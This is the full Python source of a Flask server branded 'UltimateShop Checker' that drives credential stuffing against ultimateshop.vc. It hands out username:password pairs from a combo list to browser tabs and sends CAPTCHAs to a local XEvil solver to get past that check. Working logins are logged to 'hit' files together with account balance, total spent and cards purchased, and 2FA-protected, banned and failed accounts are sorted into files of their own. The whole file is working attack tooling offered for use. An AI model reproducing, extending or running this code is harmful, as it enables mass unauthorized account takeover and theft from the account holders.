from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import sys
import argparse
import requests
import base64
import logging
import time
import re
import colorama
from colorama import Fore, Back, Style
from typing import Optional

# Optional Tkinter import for GUI file selection (skipped in headless mode)
try:
    import tkinter as tk
    from tkinter import filedialog, messagebox
    TK_AVAILABLE = True
except Exception:
    tk = None
    filedialog = None
    messagebox = None
    TK_AVAILABLE = False

# Initialize colorama for cross-platform colored output
colorama.init(autoreset=True)

# XEvil Configuration - CHANGE THIS TO YOUR ACTUAL KEY!
# Read from env if provided, else keep placeholder. Can also be overridden via CLI.
XEVIL_API_KEY = os.getenv("XEVIL_API_KEY", "YOUR_XEVIL_API_KEY_HERE")

# Setup logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Setup paths
script_dir = os.path.dirname(os.path.abspath(__file__))
HIT_FOLDER = os.path.join(script_dir, "hit")
if not os.path.exists(HIT_FOLDER):
    os.makedirs(HIT_FOLDER)

app = Flask(__name__)
CORS(app)

# App runtime configuration (can be overridden by CLI/env)
app.config.setdefault("DUMMY_CAPTCHA", bool(int(os.getenv("DUMMY_CAPTCHA", "0"))))
app.config.setdefault("HOST", os.getenv("HOST", "0.0.0.0"))
app.config.setdefault("PORT", int(os.getenv("PORT", "5050")))

# Default accounts file path (used only in headless if provided)
DEFAULT_ACCOUNTS_FILE = os.path.join(script_dir, "accounts.txt")

# ASCII Banner
def print_banner():
    banner = f"""
{Fore.RED}██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗    ███████╗██╗  ██╗ ██████╗ ██████╗ 
{Fore.GREEN}██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝    ██╔════╝██║  ██║██╔═══██╗██╔══██╗
{Fore.YELLOW}██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗      ███████╗███████║██║   ██║██████╔╝
{Fore.BLUE}██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝      ╚════██║██╔══██║██║   ██║██╔═══╝ 
{Fore.MAGENTA}╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗    ███████║██║  ██║╚██████╔╝██║     
{Fore.CYAN} ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝    ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     

{Fore.CYAN}{'═' * 80}
{Fore.YELLOW}Developer: @AliveRishu{Fore.CYAN}
{Fore.CYAN}{'═' * 80}
{Fore.GREEN}Features: UltimateShop Checker (Multiple Tabs Support){Fore.CYAN}
{Fore.CYAN}{'═' * 80}
"""
    print(banner)

def show_menu():
    menu = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  {Fore.YELLOW}OPTION 1: ULTIMATE SHOP CHECKER (MULTIPLE TABS){Fore.CYAN}                              ║
║  {Fore.RED}OPTION 2: EXIT{Fore.CYAN}                                                                  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
    print(menu)

def get_user_choice():
    while True:
        choice = input(f"{Fore.YELLOW}Select your option (1 or 2): {Style.RESET_ALL}").strip()
        if choice == "1":
            return "checker"
        elif choice == "2":
            return "exit"
        else:
            print(f"{Fore.RED}❌ Invalid option! Please select 1 or 2{Style.RESET_ALL}")

def print_status(message, status_type="info"):
    colors = {
        "info": Fore.CYAN,
        "success": Fore.GREEN,
        "warning": Fore.YELLOW,
        "error": Fore.RED,
        "highlight": Fore.MAGENTA
    }
    color = colors.get(status_type, Fore.WHITE)
    timestamp = time.strftime("%H:%M:%S")
    print(f"{Fore.BLUE}[{timestamp}]{color} {message}{Style.RESET_ALL}")

def print_separator():
    print(f"{Fore.CYAN}{'═' * 80}{Style.RESET_ALL}")

# Tkinter File Dialog
def select_file_dialog():
    if not TK_AVAILABLE:
        print_status("❌ GUI not available (Tkinter not installed or no display)", "error")
        return None

    print_status("📁 Opening file selection dialog...", "info")

    # Hide main window
    root = tk.Tk()
    root.withdraw()

    try:
        # Show file dialog
        file_path = filedialog.askopenfilename(
            title="Select Accounts File",
            filetypes=[
                ("Text files", "*.txt"),
                ("All files", "*.*")
            ],
            initialdir=os.getcwd()
        )

        if file_path:
            print_status(f"✅ File selected: {os.path.basename(file_path)}", "success")
            return file_path
        else:
            print_status("❌ No file selected", "error")
            return None

    except Exception as e:
        print_status(f"❌ Error in file dialog: {e}", "error")
        return None
    finally:
        try:
            root.destroy()
        except Exception:
            pass

# Load accounts file
def load_accounts_interactive():
    print_separator()
    print_status("🔍 ACCOUNT LOADING INTERFACE", "highlight")
    print_separator()
    
    while True:
        # Use Tkinter file dialog
        accounts_path = select_file_dialog()
        
        if accounts_path and os.path.exists(accounts_path):
            print_status(f"✅ Found accounts file: {os.path.basename(accounts_path)}", "success")
            return accounts_path
        else:
            print_status(f"❌ File not found or invalid", "error")
            retry = input(f"{Fore.YELLOW}Try again? (y/n): {Style.RESET_ALL}").lower()
            if retry != 'y':
                print_status("Exiting...", "error")
                exit(1)

def load_accounts():
    if not os.path.exists(ACCOUNTS_FILE):
        logger.warning('Accounts file does not exist: %s', ACCOUNTS_FILE)
        return []
    
    accounts = []
    email_pattern = re.compile(r'[\w\.-]+@[\w\.-]+\.\w+')  # Regex for email detection
    number_pattern = re.compile(r'^\d+$')  # Regex for number-only passwords
    
    try:
        with open(ACCOUNTS_FILE, "r", encoding='utf-8') as f:
            for line_number, line in enumerate(f, 1):
                line = line.strip()
                if not line:
                    continue  # Skip empty lines
                
                # Split only on the first colon
                parts = line.split(":", 1)
                if len(parts) != 2:
                    logger.warning('Skipping invalid line %d: %s', line_number, line)
                    continue
                
                username, password = parts
                if not username or not password:
                    logger.warning('Skipping line %d with missing username or password: %s', line_number, line)
                    continue
                
                if email_pattern.match(username):
                    logger.warning('Skipping email format at line %d: %s', line_number, username)
                    continue
                
                if number_pattern.match(password.strip()):
                    logger.warning('Skipping number-only password at line %d: %s', line_number, password)
                    continue
                
                accounts.append({"username": username, "password": password})
                
                if line_number % 10000 == 0:
                    logger.info('Processed %d lines', line_number)
                    
    except Exception as e:
        logger.error('Error reading accounts file: %s', str(e))
        return []
    
    logger.info('Loaded %d valid accounts', len(accounts))
    return accounts

def save_accounts(accounts):
    try:
        with open(ACCOUNTS_FILE, "w", encoding='utf-8') as f:
            for acc in accounts:
                f.write(f"{acc['username']}:{acc['password']}\n")
    except UnicodeEncodeError as e:
        logger.error('Unicode encoding error: %s', str(e))
        # Try with different encoding
        try:
            with open(ACCOUNTS_FILE, "w", encoding='cp1252', errors='ignore') as f:
                for acc in accounts:
                    f.write(f"{acc['username']}:{acc['password']}\n")
        except Exception as e2:
            logger.error('Failed to save accounts with cp1252: %s', str(e2))
            # Last resort - save without problematic characters
            with open(ACCOUNTS_FILE, "w", encoding='utf-8', errors='ignore') as f:
                for acc in accounts:
                    username = acc['username'].encode('utf-8', errors='ignore').decode('utf-8')
                    password = acc['password'].encode('utf-8', errors='ignore').decode('utf-8')
                    f.write(f"{username}:{password}\n")
    except Exception as e:
        logger.error('Error saving accounts: %s', str(e))

# Main menu and initialization
def main_menu():
    print_banner()
    show_menu()
    
    choice = get_user_choice()
    
    if choice == "exit":
        print_status("👋 Goodbye!", "highlight")
        exit(0)
    elif choice == "checker":
        print_separator()
        print_status("🚀 Starting UltimateShop Checker (Multiple Tabs Support)...", "highlight")
        return True

# Initialize accounts after user choice
ACCOUNTS_FILE = None
accounts = []


def parse_args():
    parser = argparse.ArgumentParser(description="UltimateShop Checker Server")
    parser.add_argument("--host", default=app.config["HOST"], help="Server host (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=app.config["PORT"], help="Server port (default: 5050)")
    parser.add_argument("--accounts-file", dest="accounts_file", default=os.getenv("ACCOUNTS_FILE", None), help="Path to accounts file (username:password per line)")
    parser.add_argument("--no-menu", action="store_true", help="Start without interactive menu")
    parser.add_argument("--no-gui", action="store_true", help="Disable GUI file picker (headless mode)")
    parser.add_argument("--xevil-key", dest="xevil_key", default=None, help="Override XEvil API key")
    parser.add_argument("--dummy-captcha", action="store_true", help="Return dummy CAPTCHA solution for testing")
    return parser.parse_args()


def resolve_accounts_file(preferred_path: Optional[str], no_gui: bool) -> Optional[str]:
    # Priority: CLI path -> env path -> default (only if exists) -> GUI (if allowed)
    candidate_paths = []
    if preferred_path:
        candidate_paths.append(preferred_path)
    env_path = os.getenv("ACCOUNTS_FILE")
    if env_path and env_path not in candidate_paths:
        candidate_paths.append(env_path)
    if os.path.exists(DEFAULT_ACCOUNTS_FILE) and DEFAULT_ACCOUNTS_FILE not in candidate_paths:
        candidate_paths.append(DEFAULT_ACCOUNTS_FILE)

    for path in candidate_paths:
        if path and os.path.exists(path):
            return path

    if no_gui:
        return None

    return select_file_dialog()

@app.route("/get-creds", methods=["GET"])
def get_creds():
    global accounts
    if accounts:
        acc = accounts.pop(0)
        save_accounts(accounts)
        remaining = len(accounts)
        print_status(f"🔑 Provided credentials: {acc['username']} | Remaining: {remaining}", "success")
        return jsonify(acc)
    print_status("⚠️ No credentials available", "warning")
    return jsonify({"error": "No credentials left"}), 404

@app.route("/solve-captcha", methods=["POST"])
def solve_captcha():
    data = request.json
    base64_image = data.get("image")
    if not base64_image:
        logger.error('Missing image in request')
        return jsonify({"error": "Missing image"}), 400

    logger.debug('Base64 image (first 50 chars): %s...', base64_image[:50])

    if base64_image.startswith('data:image'):
        base64_image = base64_image.split(',')[1]
        logger.debug('Stripped data URI, new base64 (first 50 chars): %s...', base64_image[:50])

    XEVIL_URL = "http://127.0.0.1:80/in.php"
    XEVIL_RESULT_URL = "http://127.0.0.1:80/res.php"
    USE_XEVIL = True

    # Check if XEvil API key is configured
    if app.config.get("DUMMY_CAPTCHA", False):
        # Dummy solver path for development/testing
        dummy_solution = "ABCD"
        logger.info('DUMMY_CAPTCHA enabled, returning dummy solution: %s', dummy_solution)
        return jsonify({'result': dummy_solution, 'captcha': dummy_solution, 'solution': dummy_solution})

    if XEVIL_API_KEY == "YOUR_XEVIL_API_KEY_HERE":
        logger.error('XEvil API key not configured! Please set your actual API key.')
        return jsonify({'error': 'XEvil API key not configured. Please edit the script and set your API key.'}), 500

    try:
        if USE_XEVIL:
            logger.info('Sending captcha to XEvil server: %s', XEVIL_URL)
            logger.info('Using API key: %s...', XEVIL_API_KEY[:10] + '...' if len(XEVIL_API_KEY) > 10 else XEVIL_API_KEY)
            
            payload = {
                'method': 'base64',
                'body': base64_image,
                'type': 1,
                'ext': 'jpg',
                'key': XEVIL_API_KEY,
                'soft_id': '1234'
            }
            
            logger.debug('XEvil payload: %s', {k: v[:50] + '...' if k == 'body' and len(str(v)) > 50 else v for k, v in payload.items()})
            
            start_time = time.time()
            response = requests.post(XEVIL_URL, data=payload, timeout=10)
            response.raise_for_status()
            logger.debug('XEvil response (took %.2f seconds): %s', time.time() - start_time, response.text)

            if response.text.startswith('OK|'):
                task_id = response.text.split('|')[1]
                logger.info('Received task ID: %s', task_id)

                for attempt in range(10):
                    logger.info('Checking result attempt %d/10...', attempt + 1)
                    result_response = requests.get(XEVIL_RESULT_URL, params={'key': XEVIL_API_KEY, 'action': 'get', 'id': task_id}, timeout=5)
                    result_response.raise_for_status()
                    result_text = result_response.text
                    logger.debug('XEvil result response: %s', result_text)

                    if result_text.startswith('OK|'):
                        captcha_solution = result_text.split('|')[1]
                        logger.info('CAPTCHA solution: %s', captcha_solution)
                        response_data = {
                            'result': captcha_solution,
                            'captcha': captcha_solution,
                            'solution': captcha_solution
                        }
                        logger.debug('Sending response to client: %s', response_data)
                        return jsonify(response_data)
                    elif 'CAPCHA_NOT_READY' in result_text:
                        logger.info('CAPTCHA not ready, waiting 3 seconds...')
                        time.sleep(3)
                    else:
                        logger.error('Unexpected result response: %s', result_text)
                        return jsonify({'error': f'Failed to get CAPTCHA solution: {result_text}'}), 500

                logger.error('CAPTCHA solution not received after 10 retries')
                return jsonify({'error': 'CAPTCHA solution not ready after retries'}), 500
            else:
                logger.error('Invalid XEvil response: %s', response.text)
                return jsonify({'error': f'Invalid XEvil response: {response.text}'}), 500
        else:
            logger.info('Sending captcha to original server: %s', ORIGINAL_URL)
            response = requests.post(ORIGINAL_URL, json={'image': base64_image}, timeout=10)
            response.raise_for_status()
            logger.debug('Original server response: %s', response.json())
            return jsonify(response.json())
    except requests.Timeout:
        logger.error('Request timed out')
        return jsonify({'error': 'Request to XEvil server timed out'}), 504
    except requests.RequestException as e:
        logger.error('Failed to solve captcha: %s', str(e))
        return jsonify({'error': f'Failed to solve captcha: {str(e)}'}), 500
    except Exception as e:
        logger.error('Unexpected error in CAPTCHA solving: %s', str(e))
        return jsonify({'error': f'Unexpected error: {str(e)}'}), 500

@app.route("/report-2fa", methods=["POST"])
def report_2fa():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    if not username or not password:
        return jsonify({"error": "Missing username or password"}), 400
    hit_file = os.path.join(HIT_FOLDER, "2fa-hit.txt")
    with open(hit_file, "a") as f:
        f.write(f"{username}:{password}\n")
    print_status(f"🔐 2FA Account: {username}", "warning")
    logger.info('Logged 2FA hit: %s', username)
    return jsonify({"status": "success"})

@app.route("/report-unactivated", methods=["POST"])
def report_unactivated():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    if not username or not password:
        return jsonify({"error": "Missing username or password"}), 400
    free_file = os.path.join(HIT_FOLDER, "free.txt")
    with open(free_file, "a") as f:
        f.write(f"{username}:{password}\n")
    print_status(f"🆓 Unactivated Account: {username}", "username")
    logger.info('Logged unactivated account: %s', username)
    return jsonify({"status": "success"})

@app.route("/report-hit", methods=["POST"])
def report_hit():
    data = request.json
    username = data.get("username")
    password = data.get("password")
    balance = data.get("balance")
    totalSpent = data.get("totalSpent")
    cardsPurchased = data.get("cardsPurchased")
    
    if not all([username, password, balance, totalSpent, cardsPurchased]):
        return jsonify({"error": "Missing data"}), 400
    
    # Check if balance is 0.00 (FREE HIT)
    if balance == "0.00" or balance == "0.00 $":
        # Save as CUSTOM (FREE HIT)
        custom_file = os.path.join(HIT_FOLDER, "custom.txt")
        with open(custom_file, "a") as f:
            f.write(f"{username}:{password} | Balance: {balance} | Total Spent: {totalSpent} | Cards: {cardsPurchased}\n")
        
        # Display CUSTOM hit with new format
        print_status(f"{Fore.YELLOW}[ CUSTOM ] | {username}:{password} | Balance : {balance} | Total Spent : {totalSpent} | Cards : {cardsPurchased}", "warning")
        print_status(f"{Fore.YELLOW}Made By 🔥 @AliveRishu 🔥", "warning")
        
    else:
        # Save as regular HIT
        hit_file = os.path.join(HIT_FOLDER, "hit.txt")
        with open(hit_file, "a") as f:
            f.write(f"{username}:{password} | Balance: {balance} | Total Spent: {totalSpent} | Cards: {cardsPurchased}\n")
        
        # Display HIT with new format
        print_status(f"{Fore.GREEN}[ HIT ] | {username}:{password} | Balance : {balance} | Total Spent : {totalSpent} | Cards : {cardsPurchased}", "success")
        print_status(f"{Fore.GREEN}Made By 🔥 @AliveRishu 🔥", "success")
    
    logger.info('Logged hit: %s', username)
    return jsonify({"status": "success"})

@app.route('/report-fail', methods=['POST'])
def report_fail():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if username and password:
        # Save to fail.txt
        fail_file = os.path.join(HIT_FOLDER, "fail.txt")
        with open(fail_file, "a", encoding='utf-8') as f:
            f.write(f"{username}:{password}\n")
        
        print_status(f"{Fore.RED}[ FAIL ] | {username}:{password}", "error")
        print_status(f"{Fore.RED}Made By 🔥 @AliveRishu 🔥", "error")
        
        return jsonify({"status": "success", "message": "Fail reported"})
    
    return jsonify({"status": "error", "message": "Missing username or password"}), 400

@app.route('/report-banned', methods=['POST'])
def report_banned():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if username and password:
        # Save to banned.txt
        banned_file = os.path.join(HIT_FOLDER, "banned.txt")
        with open(banned_file, "a", encoding='utf-8') as f:
            f.write(f"{username}:{password}\n")
        
        print_status(f"{Fore.RED}[ BANNED ] | {username}:{password}", "error")
        print_status(f"{Fore.RED}Made By 🔥 @AliveRishu 🔥", "error")
        
        return jsonify({"status": "success", "message": "Banned account reported"})
    
    return jsonify({"status": "error", "message": "Missing username or password"}), 400

@app.route("/status", methods=["GET"])
def get_status():
    return jsonify({
        "status": "running",
        "accounts_remaining": len(accounts),
        "total_loaded": len(accounts) + (1000000 - len(accounts) if len(accounts) < 1000000 else 0),
        "server_time": time.strftime("%Y-%m-%d %H:%M:%S")
    })

if __name__ == "__main__":
    try:
        args = parse_args()

        # Configure runtime from args/env
        if args.xevil_key:
            XEVIL_API_KEY = args.xevil_key  # noqa: F841  (keep global usage below)
        app.config["DUMMY_CAPTCHA"] = bool(args.dummy_captcha or app.config.get("DUMMY_CAPTCHA", False))

        # Decide whether to show menu
        interactive_menu = not args.no_menu and sys.stdin.isatty()

        if interactive_menu:
            if not main_menu():
                sys.exit(0)
        else:
            print_banner()
            print_status("🚀 Starting UltimateShop Checker (Headless Mode)...", "highlight")

        # Resolve accounts file (CLI/env/default or GUI)
        ACCOUNTS_FILE = resolve_accounts_file(args.accounts_file, no_gui=args.no_gui or not interactive_menu)
        if not ACCOUNTS_FILE:
            print_status("❌ No accounts file provided or selected. Use --accounts-file or set ACCOUNTS_FILE env.", "error")
            sys.exit(1)

        accounts = load_accounts()

        # Print initial stats
        print_separator()
        print_status(f"📊 LOADED {len(accounts)} VALID ACCOUNTS", "success")
        print_status(f"📁 File: {os.path.basename(ACCOUNTS_FILE)}", "info")
        print_status(f"🌐 Server will start on: http://{args.host}:{args.port}", "info")
        if app.config.get("DUMMY_CAPTCHA", False):
            print_status("🧪 Dummy CAPTCHA mode enabled (for testing)", "warning")
        print_status("🔧 Press Ctrl+C to stop the server", "warning")
        print_status("📱 Open multiple ultimateshop.vc tabs for parallel checking", "highlight")
        print_separator()

        # Start Flask server
        app.run(host=args.host, port=args.port, debug=False)

    except KeyboardInterrupt:
        print_separator()
        print_status("🛑 Server stopped by user", "error")
        print_status("👋 Goodbye!", "highlight")
    except Exception as e:
        print_status(f"❌ Error starting server: {e}", "error")
        print_status("Please check the error message above and try again", "warning")